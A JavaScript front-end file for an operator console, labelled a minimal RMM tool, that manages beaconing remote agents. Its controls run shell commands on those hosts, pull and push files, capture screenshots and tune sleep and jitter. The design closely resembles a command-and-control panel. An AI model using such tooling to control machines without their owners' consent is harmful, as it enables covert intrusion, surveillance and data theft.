/**
 * Minimal RMM web operator UI — shell-style console, REST + WebSocket.
 */
const STORAGE_KEY = "rmm_api_token";
const EVENT_CURSORS_KEY = "rmm_event_cursors";

const state = {
  token: sessionStorage.getItem(STORAGE_KEY) || "",
  sessions: [],
  historySessions: [],
  selectedId: null,
  selectedHistoryId: null,
  viewMode: "live",
  lastEventId: 0,
  localEventSeq: 0,
  ws: null,
  wsConnected: false,
  pollTimer: null,
  sessionPollTimer: null,
  statusTickTimer: null,
  sessionDownloads: [],
  /** Commands echoed locally; skip duplicate operator lines from server. */
  echoedCommands: new Set(),
};

const $ = (sel) => document.querySelector(sel);

async function api(path, options = {}) {
  const headers = {
    Accept: "application/json",
    ...(options.headers || {}),
  };
  if (state.token) {
    headers.Authorization = `Bearer ${state.token}`;
  }
  const res = await fetch(`/api/v1${path}`, { ...options, headers });
  let data = {};
  const text = await res.text();
  if (text) {
    try {
      data = JSON.parse(text);
    } catch {
      data = { error: text };
    }
  }
  return { status: res.status, data };
}

function artifactSrc(url) {
  if (!url) return "";
  const sep = url.includes("?") ? "&" : "?";
  return `${url}${sep}token=${encodeURIComponent(state.token)}`;
}

function show(el) {
  el.classList.remove("hidden");
}
function hide(el) {
  el.classList.add("hidden");
}

function formatFileSize(bytes) {
  const n = Number(bytes);
  if (!Number.isFinite(n) || n < 0) return "?";
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1024 * 1024 * 1024) return `${(n / (1024 * 1024)).toFixed(1)} MB`;
  return `${(n / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

const PREVIEW_TEXT_EXT = new Set([
  ".txt", ".log", ".json", ".xml", ".csv", ".md", ".ini", ".cfg", ".yaml", ".yml",
]);
const PREVIEW_IMAGE_EXT = new Set([".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp"]);
const PREVIEW_MAX_BYTES = 1024 * 1024;

function fileExtension(name) {
  const i = String(name || "").lastIndexOf(".");
  return i >= 0 ? String(name).slice(i).toLowerCase() : "";
}

function canPreviewDownload(entry) {
  const ext = fileExtension(entry.remote_path || entry.artifact);
  if (PREVIEW_IMAGE_EXT.has(ext)) return "image";
  if (PREVIEW_TEXT_EXT.has(ext) && Number(entry.size) <= PREVIEW_MAX_BYTES) return "text";
  return null;
}

function renderDownloadsList(downloads) {
  const container = $("#downloads-list");
  if (!container) return;
  state.sessionDownloads = downloads || [];
  if (!state.sessionDownloads.length) {
    container.innerHTML = '<p class="downloads-empty">No files downloaded yet.</p>';
    return;
  }
  const rows = state.sessionDownloads
    .map((d, i) => {
      const src = artifactSrc(d.artifact_url);
      const previewKind = canPreviewDownload(d);
      const previewBtn = previewKind
        ? `<button type="button" class="secondary btn-dl-preview" data-idx="${i}">Preview</button>`
        : "";
      return `<tr>
        <td class="path" title="${escapeHtml(d.remote_path || "")}">${escapeHtml(d.remote_path || d.artifact)}</td>
        <td>${escapeHtml(formatFileSize(d.size))}</td>
        <td>${escapeHtml(formatAgoFromIso(d.received_at))}</td>
        <td><div class="downloads-actions">
          <a class="secondary" href="${escapeHtml(src)}" download>Download</a>
          ${previewBtn}
        </div></td>
      </tr>`;
    })
    .join("");
  container.innerHTML = `<table class="downloads-table">
    <thead><tr><th>Remote path</th><th>Size</th><th>Received</th><th>Actions</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>
  <div id="downloads-preview" class="downloads-preview hidden"></div>`;
  container.querySelectorAll(".btn-dl-preview").forEach((btn) => {
    btn.addEventListener("click", () => {
      const idx = Number(btn.dataset.idx);
      const entry = state.sessionDownloads[idx];
      if (!entry) return;
      const kind = canPreviewDownload(entry);
      previewDownload(artifactSrc(entry.artifact_url), kind, entry.remote_path || entry.artifact).catch(
        (err) => {
          appendShellError(err.message || String(err));
        }
      );
    });
  });
}

function formatAgoFromIso(iso) {
  if (!iso) return "?";
  try {
    const sec = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
    return formatAgo(sec);
  } catch {
    return iso;
  }
}

async function fetchSessionDownloads() {
  if (!state.selectedId) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/downloads`
  );
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  renderDownloadsList(data.downloads || []);
}

async function previewDownload(url, kind, name) {
  const panel = $("#downloads-preview");
  if (!panel) return;
  panel.classList.remove("hidden");
  panel.innerHTML = `<p class="downloads-empty">Loading ${escapeHtml(name)}…</p>`;
  const res = await fetch(url);
  if (!res.ok) {
    throw new Error(`Preview failed (HTTP ${res.status})`);
  }
  if (kind === "image") {
    const blob = await res.blob();
    const objUrl = URL.createObjectURL(blob);
    panel.innerHTML = `<div>${escapeHtml(name)}</div><img src="${objUrl}" alt="preview">`;
    return;
  }
  const text = await res.text();
  panel.innerHTML = `<div>${escapeHtml(name)}</div><pre>${escapeHtml(text)}</pre>`;
}

function computeBeaconStatus(session) {
  if (session?.beacon_status) {
    return session.beacon_status;
  }
  if (!session?.last_seen) return "?";
  const elapsed = (Date.now() - new Date(session.last_seen).getTime()) / 1000;
  const sleep = Number(session.sleep_seconds) || 60;
  const jitter = Number(session.jitter_percent) || 30;
  const expectedMax = sleep + sleep * (jitter / 100) + 15;
  if (elapsed <= expectedMax * 1.5) return "online";
  if (elapsed <= expectedMax * 4) return "stale";
  return "offline";
}

function sessionAgoSeconds(session) {
  if (session?.last_seen_ago_seconds != null && Number.isFinite(session.last_seen_ago_seconds)) {
    return Math.max(0, Math.floor(session.last_seen_ago_seconds));
  }
  if (!session?.last_seen) return null;
  return Math.max(0, Math.floor((Date.now() - new Date(session.last_seen).getTime()) / 1000));
}

function applySessionsUpdate(sessions) {
  state.sessions = sessions || [];
  updateSessionSidebarMeta();
  if (state.viewMode === "live" && state.selectedId) {
    if (!state.sessions.some((s) => s.id === state.selectedId)) {
      showEmptyConsole();
    }
  }
  renderSessionList();
  updateShellPrompt();
}

function updateSessionSidebarMeta() {
  const countEl = $("#session-count");
  const hintEl = $("#session-hint");
  const n = state.sessions.length;
  if (countEl) {
    countEl.textContent = n ? `(${n})` : "";
  }
  if (hintEl) {
    if (n === 0) {
      hintEl.textContent =
        "No agents connected. Confirm the client $u matches this server URL and RMM_BEACON_SECRET matches the server.";
      hintEl.classList.remove("hidden");
    } else {
      hintEl.classList.add("hidden");
    }
  }
}

function setConsoleReadOnly(readonly) {
  const panel = $("#console-panel");
  const banner = $("#console-readonly-banner");
  const input = $("#shell-input");
  panel.classList.toggle("readonly-mode", readonly);
  banner.classList.toggle("hidden", !readonly);
  if (input) {
    input.disabled = readonly;
  }
}

function stopSessionPolling() {
  if (state.sessionPollTimer) {
    clearInterval(state.sessionPollTimer);
    state.sessionPollTimer = null;
  }
}

function stopStatusTick() {
  if (state.statusTickTimer) {
    clearInterval(state.statusTickTimer);
    state.statusTickTimer = null;
  }
}

function startSessionPolling() {
  stopSessionPolling();
  const tick = () => {
    refreshSessions().catch(() => {});
    fetchSessionHistory().catch(() => {});
  };
  tick();
  state.sessionPollTimer = setInterval(tick, 5000);
}

function startStatusTick() {
  stopStatusTick();
  state.statusTickTimer = setInterval(() => {
    if (state.sessions.length) {
      renderSessionList();
    }
  }, 15000);
}

async function fetchSessionHistory() {
  if (!state.token) return;
  const { status, data } = await api("/history");
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  state.historySessions = data.sessions || [];
  renderHistoryList();
}

function renderHistoryList() {
  const ul = $("#history-list");
  const empty = $("#history-empty");
  if (!ul) return;
  ul.innerHTML = "";
  const rows = state.historySessions.filter((s) => !s.active);
  if (empty) {
    empty.classList.toggle("hidden", rows.length > 0);
  }
  for (const s of rows) {
    const li = document.createElement("li");
    li.className =
      "session-item history-item" +
      (s.session_id === state.selectedHistoryId && state.viewMode === "history" ? " active" : "");
    const ended = s.ended_at ? formatTime(s.ended_at) : formatTime(s.updated_at || s.last_seen);
    const reason = s.end_reason ? ` · ${s.end_reason}` : "";
    li.innerHTML = `
      <div class="id">${escapeHtml((s.session_id || "").slice(0, 8))}<span class="ended-tag">archived</span></div>
      <div class="meta">${escapeHtml(s.username || "?")}@${escapeHtml(s.hostname || "?")}</div>
      <div class="sub">${escapeHtml(String(s.event_count || 0))} events · ended ${escapeHtml(ended)}${escapeHtml(reason)}</div>
    `;
    li.addEventListener("click", () => selectHistorySession(s.session_id));
    ul.appendChild(li);
  }
}

async function selectHistorySession(id) {
  state.viewMode = "history";
  state.selectedHistoryId = id;
  state.selectedId = null;
  state.lastEventId = 0;
  state.echoedCommands.clear();
  stopEventPolling();
  renderSessionList();
  renderHistoryList();

  const { status, data } = await api(`/history/${encodeURIComponent(id)}`);
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
    return;
  }
  const s = data.session || {};
  hide($("#empty-state"));
  show($("#console-panel"));
  setConsoleReadOnly(true);

  $("#console-title").textContent = `${s.username || "?"}@${s.hostname || "?"}`;
  const ended = s.ended_at ? formatTime(s.ended_at) : "unknown";
  $("#console-detail").textContent = `${id} · archived · ended ${ended}${s.end_reason ? ` (${s.end_reason})` : ""}`;
  shellOutputEl().innerHTML = "";
  updateShellPrompt();
  appendShellMeta(`Archived transcript — ${s.event_count || 0} events`);

  const evRes = await api(`/history/${encodeURIComponent(id)}/events?since=0&limit=500`);
  if (evRes.status === 200) {
    const events = (evRes.data.events || []).sort((a, b) => (a.id || 0) - (b.id || 0));
    for (const ev of events) {
      appendEvent(ev, { history: true });
    }
  }
}

function formatTime(iso) {
  try {
    return new Date(iso).toLocaleString();
  } catch {
    return iso;
  }
}

function formatAgo(seconds) {
  const s = Number(seconds);
  if (!Number.isFinite(s) || s < 0) return "?";
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function statusClass(status) {
  if (status === "online") return "status-online";
  if (status === "stale") return "status-stale";
  if (status === "offline") return "status-offline";
  return "";
}

function escapeHtml(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function setWsStatus(connected) {
  state.wsConnected = connected;
  const dot = $("#ws-status");
  dot.classList.toggle("connected", connected);
  dot.title = connected ? "WebSocket connected" : "WebSocket disconnected";
}

function wsUrl() {
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  const q = new URLSearchParams({
    token: state.token,
  });
  if (state.selectedId) {
    q.set("session", state.selectedId);
  }
  return `${proto}//${location.host}/api/v1/ws?${q}`;
}

function connectWebSocket() {
  disconnectWebSocket();
  if (!state.token) return;

  const ws = new WebSocket(wsUrl());
  state.ws = ws;

  ws.onopen = () => {
    setWsStatus(true);
    refreshSessions().catch(() => {});
    fetchSessionHistory().catch(() => {});
    if (state.selectedId) {
      wsSubscribe(state.selectedId);
    }
  };

  ws.onclose = () => {
    setWsStatus(false);
    if (state.token && $("#app").classList.contains("hidden") === false) {
      setTimeout(connectWebSocket, 3000);
    }
  };

  ws.onerror = () => setWsStatus(false);

  ws.onmessage = (ev) => {
    let msg;
    try {
      msg = JSON.parse(ev.data);
    } catch {
      return;
    }
    if (msg.op === "sessions") {
      applySessionsUpdate(msg.sessions || []);
      return;
    }
    if (msg.op === "event") {
      if (state.viewMode !== "live") return;
      if (!state.selectedId || msg.session_id === state.selectedId) {
        appendEvent(msg.event);
      }
      return;
    }
    if (msg.op === "ping") {
      ws.send(JSON.stringify({ op: "pong" }));
    }
  };
}

function disconnectWebSocket() {
  if (state.ws) {
    state.ws.onclose = null;
    state.ws.close();
    state.ws = null;
  }
  setWsStatus(false);
}

function stopEventPolling() {
  if (state.pollTimer) {
    clearInterval(state.pollTimer);
    state.pollTimer = null;
  }
}

async function pollSessionEvents() {
  if (!state.selectedId || !state.token) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/events?since=${state.lastEventId}&limit=100`
  );
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  for (const ev of data.events || []) {
    appendEvent(ev);
  }
}

function startEventPolling() {
  stopEventPolling();
  state.pollTimer = setInterval(() => {
    pollSessionEvents().catch(() => {});
  }, 2500);
}

function wsSubscribe(sessionId) {
  if (state.ws && state.ws.readyState === WebSocket.OPEN) {
    state.ws.send(JSON.stringify({ op: "subscribe", session_id: sessionId }));
  }
}

function updateShellPrompt() {
  const el = $("#shell-prompt");
  if (state.viewMode === "history" && state.selectedHistoryId) {
    el.textContent = "archive>";
    return;
  }
  if (!state.selectedId) {
    el.textContent = "rmm>";
    return;
  }
  const s = state.sessions.find((x) => x.id === state.selectedId);
  const short = state.selectedId.slice(0, 8);
  el.textContent = s ? `rmm:${short}>` : `rmm:${short}>`;
}

function shellOutputEl() {
  return $("#shell-output");
}

function scrollShellToBottom() {
  const log = shellOutputEl();
  log.scrollTop = log.scrollHeight;
}

function appendShellLine(kind, html) {
  const log = shellOutputEl();
  const line = document.createElement("div");
  line.className = `shell-line shell-line-${kind}`;
  line.innerHTML = html;
  log.appendChild(line);
  scrollShellToBottom();
  return line;
}

function appendShellEcho(cmd) {
  state.echoedCommands.add(cmd);
  setTimeout(() => state.echoedCommands.delete(cmd), 120000);
  appendShellLine(
    "echo",
    `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(cmd)}`
  );
}

function appendShellOutput(text) {
  if (!text) {
    appendShellLine("meta", "(no output)");
    return;
  }
  for (const line of String(text).split("\n")) {
    appendShellLine("output", escapeHtml(line));
  }
}

function appendShellMeta(text) {
  appendShellLine("meta", escapeHtml(text));
}

function appendShellError(text) {
  appendShellLine("error", escapeHtml(text));
}

function operatorCommandFromBody(body) {
  const b = String(body || "").trim();
  const idx = b.indexOf(":");
  if (idx === -1) return "";
  return b.slice(idx + 1).trim();
}

function renderEventBodyHtml(ev) {
  const body = String(ev.body || "");
  if (ev.type === "screenshot" && ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `<img class="screenshot-preview" src="${escapeHtml(src)}" alt="screenshot">`;
  }
  if (ev.type === "file_upload" && ev.artifact_url) {
    fetchSessionDownloads().catch(() => {});
    const src = artifactSrc(ev.artifact_url);
    return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" download>Download file</a>`;
  }
  if (ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" target="_blank" rel="noopener">Open artifact</a>`;
  }
  return escapeHtml(body);
}

// --- Views ---

function showLogin(err = "") {
  hide($("#app"));
  show($("#login"));
  const errEl = $("#login-error");
  errEl.textContent = err;
  errEl.classList.toggle("hidden", !err);
}

function showApp() {
  hide($("#login"));
  show($("#app"));
}

async function connect() {
  const token = $("#token-input").value.trim();
  state.token = token;
  const { status, data } = await api("/health");
  if (status === 401) {
    showLogin("Invalid API token");
    return;
  }
  if (status !== 200) {
    showLogin(data.detail || data.error || `Health check failed (${status})`);
    return;
  }
  sessionStorage.setItem(STORAGE_KEY, token);
  showApp();
  connectWebSocket();
  startEventPolling();
  startSessionPolling();
  startStatusTick();
  await refreshSessions();
  await fetchSessionHistory();
}

function disconnect() {
  disconnectWebSocket();
  stopEventPolling();
  stopSessionPolling();
  stopStatusTick();
  sessionStorage.removeItem(STORAGE_KEY);
  state.token = "";
  state.selectedId = null;
  state.echoedCommands.clear();
  showLogin();
}

async function refreshSessions() {
  const { status, data } = await api("/sessions");
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  applySessionsUpdate(data.sessions || []);
}

function renderSessionList() {
  const ul = $("#session-list");
  ul.innerHTML = "";
  for (const s of state.sessions) {
    const li = document.createElement("li");
    li.className =
      "session-item" +
      (s.id === state.selectedId && state.viewMode === "live" ? " active" : "");
    const agoSec = sessionAgoSeconds(s);
    const ago = agoSec != null ? formatAgo(agoSec) : formatTime(s.last_seen);
    const st = computeBeaconStatus(s);
    li.innerHTML = `
      <div class="id">${escapeHtml(s.id.slice(0, 8))} <span class="beacon-status ${statusClass(st)}">${escapeHtml(st)}</span></div>
      <div class="meta">${escapeHtml(s.username)}@${escapeHtml(s.hostname)}</div>
      <div class="sub">sleep ${s.sleep_seconds}s · jitter ${s.jitter_percent}% · ${escapeHtml(ago)}</div>
    `;
    li.addEventListener("click", () => selectSession(s.id));
    ul.appendChild(li);
  }
}

async function selectSession(id) {
  state.viewMode = "live";
  state.selectedHistoryId = null;
  setConsoleReadOnly(false);
  renderHistoryList();
  state.selectedId = id;
  state.lastEventId = 0;
  state.echoedCommands.clear();
  renderSessionList();
  const s = state.sessions.find((x) => x.id === id);
  if (!s) return;

  hide($("#empty-state"));
  show($("#console-panel"));

  $("#console-title").textContent = `${s.username}@${s.hostname}`;
  $("#console-detail").textContent = `${s.id} · last seen ${formatTime(s.last_seen)}`;
  $("#sleep-input").value = s.sleep_seconds;
  $("#jitter-input").value = s.jitter_percent;
  shellOutputEl().innerHTML = "";
  updateShellPrompt();
  appendShellMeta(`Session ${id.slice(0, 8)} — Enter run & wait, Ctrl+Enter queue`);

  const input = $("#shell-input");
  input.value = "";
  input.disabled = false;
  input.focus();

  connectWebSocket();
  wsSubscribe(id);
  startEventPolling();

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(id)}/events?since=0&limit=500`
  );
  if (status === 200) {
    const events = (data.events || []).sort((a, b) => (a.id || 0) - (b.id || 0));
    for (const ev of events) {
      appendEvent(ev, { history: true });
    }
    if (events.length) {
      state.lastEventId = events.reduce((m, e) => Math.max(m, e.id || 0), 0);
      saveEventCursor(id, state.lastEventId);
    }
  }
  await fetchSessionDownloads();
}

function showEmptyConsole() {
  state.selectedId = null;
  state.selectedHistoryId = null;
  state.viewMode = "live";
  setConsoleReadOnly(false);
  show($("#empty-state"));
  hide($("#console-panel"));
  $("#shell-input").value = "";
  const dl = $("#downloads-list");
  if (dl) {
    dl.innerHTML = '<p class="downloads-empty">No files downloaded yet.</p>';
  }
  renderSessionList();
  updateShellPrompt();
  connectWebSocket();
}

function loadEventCursors() {
  try {
    return JSON.parse(sessionStorage.getItem(EVENT_CURSORS_KEY) || "{}");
  } catch {
    return {};
  }
}

function saveEventCursor(sessionId, eventId) {
  if (!sessionId || typeof eventId !== "number") return;
  const cursors = loadEventCursors();
  cursors[sessionId] = Math.max(cursors[sessionId] || 0, eventId);
  sessionStorage.setItem(EVENT_CURSORS_KEY, JSON.stringify(cursors));
}

function appendEvent(ev, { local = false, history = false } = {}) {
  if (!local) {
    if (typeof ev.id === "number" && ev.id <= state.lastEventId) return;
    if (typeof ev.id === "number") {
      state.lastEventId = Math.max(state.lastEventId, ev.id);
      if (state.selectedId) {
        saveEventCursor(state.selectedId, state.lastEventId);
      }
    }
  }

  const evType = ev.type || "output";
  const body = String(ev.body || "").trim();
  const cmdEcho = (ev.command || "").trim();

  if (evType === "operator") {
    const opCmd = operatorCommandFromBody(body);
    if (history && opCmd) {
      appendShellLine(
        "echo",
        `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(opCmd)}`
      );
      if (body.startsWith("queued:")) {
        appendShellMeta("(queued)");
      }
      return;
    }
    if (!history && opCmd && state.echoedCommands.has(opCmd)) {
      if (body.startsWith("queued:")) {
        appendShellMeta("(queued — waiting for next beacon)");
      }
      return;
    }
    const label = body || "operator action";
    appendShellLine("operator", escapeHtml(label));
    return;
  }

  if (evType === "output") {
    const text = body || "";
    if (cmdEcho && !history) {
      /* result already follows echoed prompt */
    }
    appendShellOutput(text);
    return;
  }

  if (evType === "config_ack") {
    appendShellMeta(body ? `Config applied: ${body}` : "Config applied on agent");
    return;
  }

  if (evType === "error" || evType === "queued") {
    appendShellMeta(body || evType);
    return;
  }

  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
    const block = document.createElement("div");
    block.className = "shell-line shell-line-output";
    block.innerHTML = renderEventBodyHtml(ev);
    shellOutputEl().appendChild(block);
    scrollShellToBottom();
    return;
  }

  appendShellLine("operator", `[${ev.id}] ${escapeHtml(evType)}${cmdEcho ? ` » ${escapeHtml(cmdEcho)}` : ""}`);
  if (body) {
    appendShellOutput(body);
  }
}

function clearShellInput() {
  const input = $("#shell-input");
  input.value = "";
  input.blur();
  input.focus();
}

async function runCommand(wait) {
  const input = $("#shell-input");
  const cmd = input.value.trim();
  if (!cmd || !state.selectedId) return;

  clearShellInput();
  appendShellEcho(cmd);
  input.disabled = true;

  try {
    if (wait) {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/exec`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, timeout: 120 }),
        }
      );
      if (status === 408) {
        appendShellError(
          "Timed out — beacon interval may be long; try Ctrl+Enter to queue instead"
        );
      } else if (status === 200 && data.event) {
        appendEvent(data.event);
      } else {
        appendShellError(data.error || `HTTP ${status}`);
      }
    } else {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/commands`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, type: "oneshot" }),
        }
      );
      if (status === 200) {
        appendShellMeta("(queued — waiting for next beacon)");
        pollSessionEvents().catch(() => {});
      } else {
        appendShellError(data.error || `HTTP ${status}`);
      }
    }
  } finally {
    input.disabled = false;
    clearShellInput();
    input.focus();
  }
}

async function queueDownload() {
  const remote = $("#download-remote").value.trim();
  if (!remote || !state.selectedId) return;
  appendShellEcho(`download ${remote}`);
  $("#download-remote").value = "";
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/download`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote }),
    }
  );
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
  } else {
    appendShellMeta("(download queued)");
  }
}

async function queueScreenshot() {
  if (!state.selectedId) return;
  appendShellEcho("screenshot");
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
    { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
  );
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
  } else {
    appendShellMeta("(screenshot queued)");
  }
}

async function queueUpload() {
  const fileInput = $("#upload-file");
  const remote = $("#upload-remote").value.trim();
  if (!state.selectedId || !fileInput.files?.length || !remote) return;

  const file = fileInput.files[0];
  appendShellEcho(`upload ${file.name} → ${remote}`);
  const buf = await file.arrayBuffer();
  const bytes = new Uint8Array(buf);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const content_b64 = btoa(binary);

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/upload`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote, content_b64 }),
    }
  );
  fileInput.value = "";
  $("#upload-remote").value = "";
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
  } else {
    appendShellMeta("(upload queued)");
  }
}

async function killSession() {
  if (!state.selectedId || !confirm("Kill this session? The remote client will exit.")) return;
  const id = state.selectedId;
  const { status } = await api(`/sessions/${encodeURIComponent(id)}`, {
    method: "DELETE",
  });
  if (status === 200) {
    showEmptyConsole();
    await refreshSessions();
    await fetchSessionHistory();
  }
}

async function applyConfig() {
  if (!state.selectedId) return;
  const sleep = parseInt($("#sleep-input").value, 10);
  const jitter = parseInt($("#jitter-input").value, 10);
  await api(`/sessions/${encodeURIComponent(state.selectedId)}/config`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sleep_seconds: sleep, jitter_percent: jitter }),
  });
  appendShellMeta(`Beacon config → sleep ${sleep}s, jitter ${jitter}%`);
  await refreshSessions();
}

window.rmmApi = api;
window.rmmState = state;

document.addEventListener("DOMContentLoaded", () => {
  if (typeof window.initAiPanel === "function") {
    window.initAiPanel();
  }
  $("#connect-btn").addEventListener("click", connect);
  $("#token-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") connect();
  });
  $("#disconnect-btn").addEventListener("click", disconnect);
  $("#btn-kill").addEventListener("click", killSession);
  $("#btn-config").addEventListener("click", applyConfig);
  $("#btn-download").addEventListener("click", queueDownload);
  $("#btn-screenshot").addEventListener("click", queueScreenshot);
  $("#btn-upload").addEventListener("click", queueUpload);

  $("#shell-form").addEventListener("submit", (e) => {
    e.preventDefault();
    runCommand(true);
  });

  $("#shell-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter" && e.ctrlKey) {
      e.preventDefault();
      runCommand(false);
    }
  });

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && state.token && !$("#app").classList.contains("hidden")) {
      refreshSessions().catch(() => {});
      fetchSessionHistory().catch(() => {});
    }
  });

  if (state.token) {
    $("#token-input").value = state.token;
    connect();
  } else {
    showLogin();
  }
});
